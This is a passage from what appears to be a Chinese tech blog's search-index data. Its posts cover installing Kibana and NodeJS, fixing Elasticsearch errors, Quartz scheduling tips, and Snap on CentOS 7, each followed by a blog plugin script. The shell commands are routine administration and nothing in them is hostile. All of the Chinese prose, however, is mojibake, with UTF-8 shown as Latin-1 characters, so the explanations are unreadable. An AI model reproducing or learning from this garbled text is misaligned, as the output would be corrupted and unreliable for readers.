nohup grunt server &gt; es-head.log 2&gt;&amp;1 &amp;# æµ‹è¯•è®¿é—®elasticsearch-headï¼Œæµè§ˆå™¨è¾“å…¥ç½‘å€ï¼šhttp://192.168.25.131:9100 ElasticSearch å®‰è£… Kibana æ’ä»¶ Kibana æ˜¯ä¸€ä¸ªé’ˆå¯¹ Elasticsearch çš„å¼€æºåˆ†æåŠå¯è§†åŒ–å¹³å°ï¼Œä½¿ç”¨ Kibana å¯ä»¥æŸ¥è¯¢ã€æŸ¥çœ‹å¹¶ä¸å­˜å‚¨åœ¨ ES ç´¢å¼•çš„æ•°æ®è¿›è¡Œäº¤äº’æ“ä½œï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œé«˜çº§çš„æ•°æ®åˆ†æï¼Œå¹¶èƒ½ä»¥å›¾è¡¨ã€è¡¨æ ¼å’Œåœ°å›¾çš„å½¢å¼æŸ¥çœ‹æ•°æ®ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local# ä¸‹è½½kibana# wget https://artifacts.elastic.co/downloads/kibana/kibana-7.2.0-linux-x86_64.tar.gz# è§£å‹kibana# tar -xvf kibana-7.2.0-linux-x86_64.tar.gz# mv kibana-7.2.0-linux-x86_64 kibana-7.2.0# åˆ é™¤ä¸‹è½½æ–‡ä»¶# rm -f kibana-7.2.0-linux-x86_64.tar.gz# æ›´æ”¹æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·ç»„åŠç”¨æˆ·# chown -R elasticsearch:elasticsearch kibana-7.2.0# ä¿®æ”¹ESæœåŠ¡çš„IP# vim kibana-7.2.0/config/kibana.yml# å°†server.hostã€elasticsearch.hostsä¿®æ”¹ä¸ºESçš„æœåŠ¡å™¨IPåœ°å€ï¼Œä¸èƒ½ä½¿ç”¨localhostæˆ–è€…127.0.0.1# é˜²ç«å¢™å¼€æ”¾kibanaçš„ç«¯å£5601# firewall-cmd --zone=public --permanent --add-port=5601/tcp# firewall-cmd --reload# åˆ‡æ¢ESç”¨æˆ·# su elasticsearch# åå°å¯åŠ¨ES$ cd /usr/local/elasticsearch-7.2.0/bin$ ./elasticsearch -d# å‰å°å¯åŠ¨kibana$ cd /usr/local/kibana-7.2.0/bin$ ./kibana# æˆ–è€…åå°å¯åŠ¨kibana$ cd /usr/local/kibana-7.2.0/bin$ nohup ./kibana &gt; kibana.log 2&gt;&amp;1 &amp;# æµ‹è¯•è®¿é—®kibanaï¼Œæµè§ˆå™¨è¾“å…¥ç½‘å€ï¼šhttp://192.168.25.131:5601 ElasticSearch å¸¸è§é”™è¯¯è§£å†³æ–¹æ¡ˆ 1234567891011# é”™è¯¯ï¼šmax virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]# æ°¸ä¹…ä¿®æ”¹# vim /etc/sysctl.confvm.max_map_count=262144# ä½¿ä¿®æ”¹ç”Ÿæ•ˆ# /sbin/sysctl -p# æŸ¥çœ‹ä¿®æ”¹ç»“æœ# sysctl vm.max_map_count 1234567891011# é”™è¯¯ï¼šmax file descriptors [4096] for elasticsearch process is too low, increase to at least [65536]# æŸ¥çœ‹é™åˆ¶# ulimit -Hn# é’ˆå¯¹elasticsearchç”¨æˆ·ï¼Œä¿®æ”¹æœ€å¤§æ–‡ä»¶æè¿°ç¬¦æ•°# vim /etc/security/limits.confelasticsearch hard nproc 4096elasticsearch soft nproc 4096elasticsearch hard nofile 1048576elasticsearch soft nofile 1048576 123456# é”™è¯¯ï¼šthe default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configured# æŒ‡å®šESèŠ‚ç‚¹åç§°ã€MasterèŠ‚ç‚¹# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlnode.name: node-1 # ESèŠ‚ç‚¹åç§°cluster.initial_master_nodes: ["node-1"] # ESçš„ä¸»èŠ‚ç‚¹ï¼Œå³node-nameé…ç½®çš„å€¼ 123# é”™è¯¯ï¼šERROR: bootstrap checks failed memory locking requested for elasticsearch process but memory is not locked# è§£å†³æ–¹æ¡ˆå¯å‚è€ƒï¼šhttps://www.cnblogs.com/hellxz/p/11009634.html var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Linux å®‰è£… NodeJS",url:"/posts/fe4ed47c.html",text:'å‰è¨€ Linux ç¯å¢ƒä¸‹å®‰è£… NodeJSï¼Œå¯ä»¥é€‰æ‹©æ‰‹åŠ¨ç¼–è¯‘å®‰è£…æˆ–è€…ç›´æ¥ä½¿ç”¨ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶åŒ…æ¥å®‰è£…ã€‚å¦‚æœæ˜¯æ‰‹åŠ¨ç¼–è¯‘å®‰è£…ï¼Œéœ€è¦å®‰è£…å¯¹åº”ç‰ˆæœ¬çš„ gc++ã€pythonã€‚æœ¬æ–‡é€‚ç”¨äº Centos/Debian/Ubuntu ç­‰ Linux å‘è¡Œç‰ˆç³»ç»Ÿã€‚ NodeJS ç¼–è¯‘å®‰è£… 1234567891011121314151617181920212223242526# è½¯ä»¶ä¾èµ–g++4.8.2python2.6 æˆ–è€… python2.7# ä¸‹è½½æºç å‹ç¼©åŒ…# wget https://nodejs.org/dist/v10.16.0/node-v10.16.0.tar.gz# è§£å‹æºç å‹ç¼©åŒ…$ tar -xvf node-v10.16.0.tar.gz# ç¼–è¯‘å®‰è£…# cd node-v10.16.0# ./configure --prefix=/usr/local/node-10.16.0# make -j4# make install# é…ç½®ç¯å¢ƒå˜é‡# vim /etc/profileexport PATH=${PATH}:/usr/local/node-10.16.0/bin# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile# æŸ¥çœ‹Nodeã€NPMçš„ç‰ˆæœ¬# npm -v# node -v NodeJS äºŒè¿›åˆ¶åŒ…å®‰è£… 1234567891011121314151617181920# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local# ä¸‹è½½å·²ç»ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶åŒ…# wget https://nodejs.org/dist/v10.16.0/node-v10.16.0-linux-x64.tar.xz# è§£å‹äºŒè¿›åˆ¶åŒ…# tar -xvf node-v10.16.0-linux-x64.tar.xz# mv node-v10.16.0-linux-x64 node-10.16.0# é…ç½®ç¯å¢ƒå˜é‡# vim /etc/profileexport PATH=${PATH}:/usr/local/node-10.16.0/bin# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile# æŸ¥çœ‹Nodeã€NPMçš„ç‰ˆæœ¬# npm -v# node -v éªŒè¯ NodeJs æ˜¯å¦å®‰è£…æˆåŠŸ ç¬¬ä¸€æ­¥ï¼šæ–°å»º JS æ–‡ä»¶ web-server.jsï¼Œä»£ç å†…å®¹å¦‚ä¸‹ï¼š 12345678var http = require(\'http\');http.createServer(function (req, res) { res.writeHead(200, {\'Content-Type\': \'text/plain\'}); res.end(\'Hello World\\n\');}).listen(8888, \'127.0.0.1\');console.log(\'Server running at http://127.0.0.1:8888/\'); ç¬¬äºŒæ­¥ï¼šè¿è¡Œ JS è„šæœ¬ï¼Œç„¶åæµè§ˆå™¨æµ‹è¯•è®¿é—® URLï¼šhttp://127.0.0.1:8888 ï¼Œå¦‚æœ NodeJS å®‰è£…æˆåŠŸï¼Œæµè§ˆå™¨ä¼šè¾“å‡ºä¿¡æ¯ï¼šHello World 1# node web-server.js ä½¿ç”¨ CNPM æ›¿ä»£ NPM 12# å…¨å±€å®‰è£…CNPM# npm install -g cnpm --registry=https://registry.npm.taobao.org var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Quartz ä¹‹ä¸€å¼€å‘éšè®°",url:"/posts/e3b4a6cc.html",text:'æ§åˆ¶ Quartz åªæ‰§è¡Œä¸€æ¬¡ çº¯ API è°ƒç”¨çš„ä»£ç  1234567891011121314public class ScheduleTest { private static final String JOB_NAME = "job"; private static final String JOB_GROUP = "jobGroup"; public void runOnceTime() throws Exception { Scheduler scheduler = schedulerFactory.getScheduler(); JobDetail jobDetail = JobBuilder.newJob(ScheduleJob.class).withIdentity(JOB_NAME, JOB_GROUP).build(); SimpleScheduleBuilder scheduleBuilder = SimpleScheduleBuilder.simpleSchedule().withIntervalInSeconds(0).withRepeatCount(0); Trigger trigger = TriggerBuilder.newTrigger().withIdentity(JOB_NAME, JOB_GROUP).withSchedule(scheduleBuilder).build(); scheduler.scheduleJob(jobDetail, trigger); scheduler.start(); }} Spring çš„ XML é…ç½® 1234567&lt;!-- é…ç½®Springé¡¹ç›®å¯åŠ¨åä»»åŠ¡å°±æ‰§è¡Œä¸€æ¬¡ --&gt;&lt;bean id="rsh_simpleTrigger1" class="org.springframework.scheduling.quartz.SimpleTriggerFactoryBean"&gt; &lt;property name="jobDetail" ref="myJobDetail" /&gt; &lt;property name="startDelay" value="500" /&gt; &lt;property name="repeatInterval" value="0" /&gt; &lt;property name="repeatCount" value="0" /&gt;&lt;/bean&gt; Quartz æ§åˆ¶çº¿ç¨‹çº§åˆ«çš„æš‚åœã€æ¢å¤ã€åœæ­¢ Quartz æä¾›äº†æš‚åœè°ƒåº¦ï¼ˆpauseTriggerã€pauseJobï¼‰ã€æ¢å¤è°ƒåº¦ï¼ˆresumeTriggerã€resumeJobï¼‰ã€åˆ é™¤è°ƒåº¦ï¼ˆdeleteJobï¼‰ç­‰ APIï¼Œä½†æœ¬è´¨éƒ½æ˜¯æ§åˆ¶ Trigger çš„è§¦å‘ï¼Œè€Œéç›´æ¥æ§åˆ¶ä»»åŠ¡çº¿ç¨‹çš„è¿è¡Œã€‚å¦‚æœè¦è¿›è¡Œçº¿ç¨‹çº§åˆ«çš„åœæ­¢ï¼Œå¯ä»¥è°ƒç”¨ scheduler.interrupt() æ–¹æ³•æ¥å®ç°ï¼Œæ­¤æ—¶ Job ç±»éœ€è¦å®ç° InterruptableJob æ¥å£ã€‚ Quartz çš„ Misfire ç­–ç•¥ Quartz ä¸­æœ‰ä¸€ç§ Job æ¥å£æ˜¯ StatefulJobï¼ˆæœ‰çŠ¶æ€ä»»åŠ¡ï¼‰ï¼Œç®€å•æ¥è¯´è¿™ç§ Job ä½¿ç”¨åœ¨ä¸èƒ½å¹¶å‘æ‰§è¡Œçš„åœºæ™¯ä¸‹ã€‚æ¯”å¦‚å®šä¹‰äº†æŸä¸ªä»»åŠ¡ï¼Œæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œå¯¹ä¸€äº›æ•°æ®è¿›è¡Œå¢åˆ æ“ä½œï¼Œæ­£å¸¸æ‰§è¡Œæ—¶ï¼Œæ¯åˆ†é’Ÿæ‰§è¡Œçš„ Job äº’ä¸å½±å“ï¼›ä½†æŸä¸ªæ—¶åˆ»å‡ºç°äº†æ„å¤–ï¼ŒæŸä¸ªä»»åŠ¡æ‰§è¡Œäº†ä¸‰åˆ†é’Ÿï¼Œé‚£ä¹ˆå½“åœ¨è¿™ä¸ªä»»åŠ¡æŒç»­æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¸å¸Œæœ›å¹¶å‘æ‰§è¡Œå¦å¤–ä¸¤æ¬¡å®šæ—¶ä»»åŠ¡çš„ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨æœ‰çŠ¶æ€ä»»åŠ¡ï¼Œè€Œæ²¡æœ‰æ‰§è¡Œçš„ä¸¤æ¬¡å®šæ—¶ä»»åŠ¡å°±æ˜¯ Misfired Jobã€‚è¿˜æœ‰ä¸€ç§ä½¿ç”¨åœºæ™¯å°±æ˜¯å½“æ‰§è¡Œæš‚åœè°ƒåº¦ï¼ˆpauseTriggerã€pauseJobï¼‰ï¼Œç„¶åæ‰§è¡Œæ¢å¤è°ƒåº¦ (resumeTriggerã€resumeJob)ï¼ŒQuartz ä¼šé»˜è®¤åœ¨æ¢å¤çš„æ—¶å€™æŠŠæš‚åœæœŸé—´æ²¡æ‰§è¡Œçš„ä»»åŠ¡å¼¥è¡¥æ‰§è¡Œã€‚å¯¹äºåˆ¤å®šæ˜¯å¦ä¸º Misfired Jobï¼Œå…¶å®æœ‰å¾ˆå¤šæ¡ä»¶ï¼Œç›®å‰äº†è§£åˆ°çš„æœ‰ï¼š è°ƒåº¦æš‚åœæ‰§è¡ŒæœŸé—´ï¼Œé¢„å®šçš„ä»»åŠ¡æœªæ‰§è¡Œ åˆ°æ‰§è¡Œæ—¶é—´æ—¶ï¼Œä¸Šä¸€ä¸ªä»»åŠ¡è¿˜æœªå®Œæˆ è¿‡æœŸæ—¶é—´å·²è¶…è¿‡è®¾ç½®çš„ misfireThreshold å‚æ•°å€¼ çº¿ç¨‹æ± ä¸­å·²æ²¡æœ‰ç©ºé—²çº¿ç¨‹ çº¿ç¨‹æ± ä¸­è™½æœ‰ç©ºé—²çº¿ç¨‹ï¼Œä½†æœ‰ä¼˜å…ˆçº§æ›´é«˜çš„ä»»åŠ¡ äº§ç”Ÿ Misfire åï¼ŒQuartz ä¼šæ ¹æ® Misfire ç­–ç•¥è¿›è¡Œä»»åŠ¡çš„å¤„ç†ï¼Œå…¶ä¸­ Triggerã€CronTriggerã€SimpleTrigger çš„ Misfire ç­–ç•¥å¦‚ä¸‹ï¼š MISFIRE_INSTRUCTION_SMART_POLICYï¼Œé»˜è®¤çš„ç­–ç•¥ MISFIRE_INSTRUCTION_FIRE_ONCE_NOWï¼Œç«‹å³è§¦å‘ä¸€æ¬¡ï¼Œè§¦å‘åæ¢å¤æ­£å¸¸çš„é¢‘ç‡ MISFIRE_INSTRUCTION_DO_NOTHINGï¼Œä»€ä¹ˆéƒ½ä¸åšï¼Œç»§ç»­ç­‰ä¸‹ä¸€æ¬¡é¢„å®šæ—¶é—´å†è§¦å‘ åœ¨ Spring çš„ XML é…ç½®ä¸­ï¼ŒMisfire ç­–ç•¥å¯ä»¥åœ¨ CronTriggerBean ä¸­é…ç½®ï¼ŒåŒæ—¶éœ€è¦åœ¨ quartz.properties é…ç½®æ–‡ä»¶ä¸­æŒ‡å®š misfireThreshold å‚æ•°çš„å€¼ï¼ˆå•ä½ä¸ºæ¯«ç§’ï¼‰ã€‚å…¶ä¸­ misfireThreshold è¡¨ç¤ºå®é™…æ‰§è¡Œæ—¶é—´ä¸ä¸‹ä¸€æ¬¡åº”è¯¥æ‰§è¡Œæ—¶é—´ä¹‹é—´çš„å·®å€¼ï¼Œè¶…è¿‡è¿™ä¸ªå·®å€¼å°±ä¸ä¼šæ‰§è¡Œï¼Œä½äºè¿™ä¸ªå·®å€¼å°±ä¼šæ‰§è¡Œã€‚ä¾‹å¦‚ä»»åŠ¡æ¯ 3 ç§’æ‰§è¡Œä¸€æ¬¡ï¼Œé…ç½® misfireThreshold=6000ï¼Œå½“æš‚åœä½äº 6 ç§’å†…ï¼ŒQuartz ä¼šå¼¥è¡¥æ‰§è¡Œï¼Œè¶…è¿‡ 6 ç§’å°±ä¸å†å¼¥è¡¥æ‰§è¡Œã€‚å…·ä½“çš„é…ç½®å¦‚ä¸‹ï¼š 12345&lt;bean id="cronTrigger" class="org.springframework.scheduling.quartz.CronTriggerBean"&gt; &lt;property name="jobDetail" ref="buildTask" /&gt; &lt;property name="cronExpression" value="0 30 16 ? * 6" /&gt; &lt;property name="misfireInstruction" value="2"&gt;&lt;/property&gt;&lt;/bean&gt; 1org.quartz.jobStore.misfireThreshold = 6000 Quartz Cron è¡¨è¾¾å¼åœ¨çº¿ç”Ÿæˆå·¥å…· CronMaker Cron Expression Generator Quartz å‚è€ƒèµ„æ–™ åŸºäº Quartz å¼€å‘ä¼ä¸šçº§ä»»åŠ¡è°ƒåº¦åº”ç”¨ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"Centos7 ä¸‹ Snap çš„å®‰è£…ä¸ä½¿ç”¨",url:"/posts/ba754e9a.html",text:'Snap ä»‹ç» Snap æ˜¯ Ubuntu æ¯å…¬å¸ Canonical äº 2016 å¹´ 4 æœˆå‘å¸ƒ Ubuntu-16.04 æ—¶å¼•å…¥çš„ä¸€ç§å…¨æ–°çš„ã€å®‰å…¨çš„ã€æ˜“äºç®¡ç†çš„ã€æ²™ç›’åŒ–çš„è½¯ä»¶åŒ…ç®¡ç†æ–¹å¼ï¼Œä¸ä¼ ç»Ÿçš„ dpkg/apt æœ‰ç€å¾ˆå¤§çš„åŒºåˆ«ï¼ŒèƒŒåä¸»è¦çš„åŠ¨æœºæ˜¯è§£å†³ Linux å¹³å°çš„ç¢ç‰‡åŒ–é—®é¢˜ã€‚Snap çš„å®‰è£…åŒ…æ‰©å±•åæ˜¯ .snapï¼Œç±»ä¼¼äºä¸€ä¸ªå®¹å™¨ï¼Œå®ƒåŒ…å«ä¸€ä¸ªåº”ç”¨ç¨‹åºéœ€è¦ç”¨åˆ°çš„æ‰€æœ‰æ–‡ä»¶å’Œåº“ï¼ˆSnap åŒ…é‡ŒåŒ…å«ä¸€ä¸ªç§æœ‰çš„ root æ–‡ä»¶ç³»ç»Ÿï¼Œé‡Œé¢åŒ…å«äº†ä¾èµ–çš„è½¯ä»¶åŒ…ï¼‰ã€‚ä¸ç®¡åº•å±‚ç³»ç»Ÿå¦‚ä½•ï¼ŒSnap éƒ½å¯è½»æ¾å®‰è£…ã€å‡çº§ã€é™çº§å’Œç§»é™¤åº”ç”¨ï¼Œå› æ­¤ Snap çš„åº”ç”¨ç¨‹åºå¾ˆå®¹æ˜“å®‰è£…åœ¨ä»»ä½•åŸºäº Linux çš„ç³»ç»Ÿä¸Šï¼Œè€Œä¸”æ”¯æŒç”¨æˆ·åœ¨åŒä¸€ä¸ªç³»ç»Ÿä¸­å®‰è£…åŒä¸€åº”ç”¨ç¨‹åºçš„å¤šä¸ªç‰ˆæœ¬ã€‚ä½¿ç”¨ Snap åŒ…çš„å¥½å¤„å°±æ˜¯å®ƒè§£å†³äº†åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¾èµ–é—®é¢˜ï¼Œä½¿åº”ç”¨ç¨‹åºä¹‹é—´æ›´å®¹æ˜“ç®¡ç†ï¼Œä½†æ˜¯ç”±æ­¤å¸¦æ¥çš„é—®é¢˜å°±æ˜¯å ç”¨æ›´å¤šçš„ç£ç›˜ç©ºé—´ã€‚ç±»ä¼¼çš„åº”ç”¨ç¨‹åºå®¹å™¨æŠ€æœ¯è¿˜æœ‰å¤§åé¼é¼çš„ Flatpakã€AppImageã€‚Snap é€‚ç”¨äº CentOS 7.6+ å’Œ Red Hat Enterprise Linux 7.6+ï¼Œå®ƒå¾ˆå¥½åœ°å¼¥è¡¥äº† Centos æ¡Œé¢è½¯ä»¶èµ„æºä¸å¤šçš„ç¼ºç‚¹ï¼Œå¯ä»¥ä» Extra Packages for Enterprise Linuxï¼ˆEPELï¼‰å­˜å‚¨åº“å®‰è£…ã€‚Snap çš„å·¥ä½œåŸç†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š Snap å®‰è£… 12345678910111213141516171819202122232425262728293031323334353637383940414243# å®‰è£…EPELæº# yum install epel-release# æ·»åŠ coprä»“åº“ï¼ˆå¯é€‰ï¼‰# yum install yum-plugin-copr# yum copr enable ngompa/snapcore-el7# å®‰è£…Snap# yum install snapd# å®‰è£…Snapçš„å…¶ä»–ç»„ä»¶ï¼ˆå¯é€‰ï¼‰# yum install snapd-glib snapd-qt snapd-qt-qmlg# å¯ç”¨é€šä¿¡å¥—æ¥å­—# systemctl enable --now snapd.socket# åˆ›å»ºè½¯é“¾æ¥# ln -s /var/lib/snapd/snap /snap# æ³¨é”€å¹¶é‡æ–°ç™»å½•ï¼Œæˆ–è€…é‡æ–°å¯åŠ¨ç³»ç»Ÿ# reboot# æŸ¥çœ‹Snapçš„è¿è¡ŒçŠ¶æ€# systemctl status snapd# å¦‚æœSnapå¤„äºå…³é—­çŠ¶æ€ï¼Œåˆ™æ‰‹åŠ¨å¯åŠ¨å®ƒ# systemctl start snapd# æ·»åŠ ç¯å¢ƒå˜é‡# vim /etc/profileexport PATH=$PATH:/snap/bin# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile# éªŒè¯æ˜¯å¦è¿è¡Œæ­£å¸¸# snap install hello# å¦‚æœè¿è¡Œæ­£å¸¸ï¼Œæ‰§è¡Œhelloä¼šè¾“å‡º"Hello, world!"# hello# æˆ–è€…å®‰è£…andy-testsnap-pyæµ‹è¯•å·¥å…·# snap install andy-testsnap-py --edge Snap å¸¸ç”¨å‘½ä»¤ 1234567891011121314151617181920212223242526272829303132333435363738# åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…çš„åº”ç”¨# snap list# æŸ¥æ‰¾åº”ç”¨# snap find hello# æŸ¥è¯¢åº”ç”¨çš„è¯¦ç»†ä¿¡æ¯# snap info hello# å®‰è£…åº”ç”¨# snap install hello# æŒ‡å®šä»“åº“å®‰è£…åº”ç”¨ï¼ˆå¯é€‰ä»“åº“ï¼šedgeã€betaã€candidateã€stableï¼‰# snap install hello --channel=stable# è¿è¡Œåº”ç”¨ï¼ˆæˆ–è€…ç›´æ¥æ‰§è¡Œï¼šhelloï¼‰# snap run hello# å¸è½½åº”ç”¨ï¼ˆåŒ…æ‹¬æ‰€æœ‰ç‰ˆæœ¬ï¼‰# snap remove hello# å¸è½½ç‰¹å®šç‰ˆæœ¬çš„åº”ç”¨# snap remove hello --revision 352# æ›´æ–°æ‰€æœ‰åº”ç”¨# snap refresh all# æ›´æ–°ç‰¹å®šçš„åº”ç”¨# snap refresh hello# å›æ»šç‰¹å®šåº”ç”¨åˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬# snap revert hello# æŸ¥çœ‹ä»»åŠ¡æ‰§è¡Œçš„å†å²è®°å½•# snap changes# ç»ˆæ­¢æ­£åœ¨æ‰§è¡Œçš„ç‰¹å®šä»»åŠ¡# snap abort task-id (adsbygoogle = window.adsbygoogle || []).push({}); Snap-Store å®‰è£… Snapcraft åº”ç”¨å•†åº—æä¾›äº†æ‰€æœ‰ Snap åº”ç”¨ç¨‹åºï¼ŒåŒæ—¶ Snap å®˜æ–¹æä¾›äº†å•†åº—åº”ç”¨ Snap-Storeï¼Œæ”¯æŒåœ¨æœ¬åœ°ä½¿ç”¨å›¾å½¢ç•Œé¢çš„æ–¹å¼ç®¡ç† Snap åº”ç”¨ç¨‹åºï¼ŒåŒ…æ‹¬å®‰è£…ã€å¸è½½ã€æœç´¢ Snap åº”ç”¨ç¨‹åºç­‰ã€‚ç‚¹å‡»æŸ¥çœ‹ Snap-Store çš„å®é™…è¿è¡Œæ•ˆæœå›¾ã€‚ 12345678910111213141516171819202122232425# å®‰è£…# snap install snap-store# åˆ›å»ºå¿«æ·æ–¹å¼# vim /usr/share/applications/snap-store.desktop[Desktop Entry]Name[zh_CN]=Snap å•†åº—Name=Snap StoreComment[zh_CN]=æ·»åŠ ã€ç§»é™¤æˆ–æ›´æ–°è®¡ç®—æœºè½¯ä»¶Comment=Add, remove or update software on this computerIcon=/snap/snap/snap-store/current/meta/gui/io.snapcraft.Store.pngExec=/snap/bin/snap-store %UTerminal=falseType=ApplicationCategories=GNOME;GTK;System;PackageManager;Keywords=Updates;Upgrade;Sources;Repositories;Preferences;Install;Uninstall;Program;Software;App;Store;Snap;StartupNotify=trueMimeType=x-scheme-handler/appstream;x-scheme-handler/snap;X-GNOME-UsesNotifications=trueDBusActivatable=false# å¯¼èˆªåˆ°ï¼šåº”ç”¨ç¨‹åº --&gt; ç³»ç»Ÿå·¥å…· --&gt; Snap å•†åº—ï¼Œç›´æ¥ç‚¹å‡»å¿«æ·æ–¹å¼å¯åŠ¨åº”ç”¨å³å¯# æˆ–è€…ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼ˆä½¿ç”¨æ™®é€šç”¨æˆ·æƒé™ï¼‰$ /snap/bin/snap-store Snap ç›¸å…³ç›®å½•ä»‹ç» 1231. é€šè¿‡snapå®‰è£…åº”ç”¨ç¨‹åºåï¼Œå…¶åº”ç”¨ç¨‹åºçš„å®‰è£…æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸ºï¼š/var/lib/snapd/snap2. æ™®é€šç”¨æˆ·çš„snapåº”ç”¨æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼š~/snap3. snapdçš„å®‰è£…ç›®å½•ï¼š/var/lib/snapd Snap æ›´æ”¹é»˜è®¤å®‰è£…ç›®å½• Snap å®‰è£…ä½¿ç”¨åæ¯”è¾ƒå ç”¨ç£ç›˜ç©ºé—´ï¼ˆé»˜è®¤å®‰è£…ç›®å½•ä¸º /var/lib/snapdï¼‰ï¼Œå¦‚æœå¸Œæœ› Snap å®‰è£…åœ¨ç‰¹å®šçš„ç›®å½•ï¼Œæ­¤æ—¶ä¸èƒ½ä½¿ç”¨åˆ›å»ºè½¯é“¾æ¥çš„æ–¹æ³•ï¼ˆln -sï¼‰æ¥å…³è”åˆ°æ–°çš„å®‰è£…ç›®å½•ï¼Œå¦åˆ™ Snap çš„åº”ç”¨å°†æ— æ³•æ­£å¸¸å¯åŠ¨ã€‚æ­£ç¡®çš„åšæ³•æ˜¯ä½¿ç”¨ mount --bind å‘½ä»¤å°†æ–°çš„å®‰è£…ç›®å½•æŒ‚è½½åˆ° /var/lib/snapd ç›®å½•ï¼Œå…·ä½“å¯å‚è€ƒä»¥ä¸‹æ•™ç¨‹æˆ–è€… Shell è„šæœ¬ï¼ˆå»ºè®®æ‰§è¡Œ Shell è„šæœ¬ä¹‹å‰å…ˆå…³é—­ snapd æœåŠ¡å’Œå¸è½½ snapd çš„ /dev/loopxx è®¾å¤‡ï¼‰ã€‚æç¤ºï¼Œ/var/snap ç›®å½•åƒä¸‡ä¸è¦ç§»åŠ¨ï¼Œè¯¥ç›®å½•ä¸€èˆ¬æƒ…å†µä¸‹ä¸éœ€è¦åšä»»ä½•å¤„ç†ã€‚ Move snap packages to another location/directory Where is a snap stored and how can I change that? 123456789101112131415161718192021222324252627282930313233343536373839404142434445############################################################################### Take Care this section may break the System !!!############################################################################### Move snap folder to Home instead of root# Create the directory, you can change the locationmkdir /home/$USER/snap/snapd# Copy the datasudo rsync -avzP /var/lib/snapd/ /home/$USER/snap/snapd/# Do backupssudo cp /etc/fstab /etc/fstab.baksudo mv /var/lib/snapd /var/lib/snapd.bak# Change fstab (Change $USER with your name or change the path totally)sudo echo "/home/$USER/snap/snapd /var/lib/snapd none bind 0 0" | sudo tee -a /etc/fstab# remount fstab or reboot.sudo mkdir /var/lib/snapdsudo mount -aif ls /var/lib/snapd/ | grep snapsthen echo "Re-mounting snapd folder is done successfully !!!!" sudo rm -rf /etc/fstab.bak sudo rm -rf /var/lib/snapd.bakelse echo "WARNING : Re-mounting snapd folder failed, please revert !!!!" # trying to revert automatically sudo cp /etc/fstab.bak /etc/fstab sudo mount -a sudo umount /var/lib/snapd sudo mv /var/lib/snapd.bak /var/lib/snapd echo "Revert automatically is done successfully !!!!"fi############################################################################### Take Care the pervious section may break the System !!!############################################################################## Snap è¾“å‡ºè°ƒè¯•ä¿¡æ¯ 12345678910111213# ç¼–è¾‘SnapæœåŠ¡çš„é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼ˆç¯å¢ƒå˜é‡ï¼‰# systemctl edit snapd.service[Service]Environment=SNAPD_DEBUG=1 SNAPD_DEBUG_HTTP=7# ä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ# systemctl daemon-reload# é‡å¯æœåŠ¡# systemctl restart snapd.service# æ‰“å°SnapæœåŠ¡çš„æ—¥å¿—ä¿¡æ¯# journalctl -xeu snapd è§£å†³ Snap ä¸‹è½½ç½‘é€Ÿæ…¢çš„é—®é¢˜ 123456789101112131415161718# æ–¹æ³•ä¸€ï¼ˆä½¿ç”¨ä»£ç†ï¼‰# 